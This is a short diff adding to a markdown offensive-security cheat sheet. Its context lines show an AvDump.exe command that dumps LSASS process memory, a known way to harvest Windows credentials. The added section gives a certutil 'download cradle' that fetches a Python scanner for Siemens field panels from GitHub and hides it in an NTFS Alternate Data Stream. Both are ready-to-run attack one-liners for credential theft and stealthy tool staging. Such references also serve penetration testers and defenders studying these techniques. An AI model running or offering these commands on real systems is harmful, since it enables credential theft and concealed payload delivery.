@@ -300,3 +300,11 @@ How to utilize Avast AV to dump LSASS (C:\Program Files\Avast Software\Avast)
 ```
 AvDump.exe --pid 1111 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp
 ```
+
+## Certutil Download Cradle
+
+Download and save a Python file to an Alternate Data Stream (ADS).
+
+```
+certutil.exe -urlcache -split -f https://github.com/RoseSecurity/APOLOGEE/blob/main/siemens_field_panel_scanner.py c:\temp:apologee.py
+```
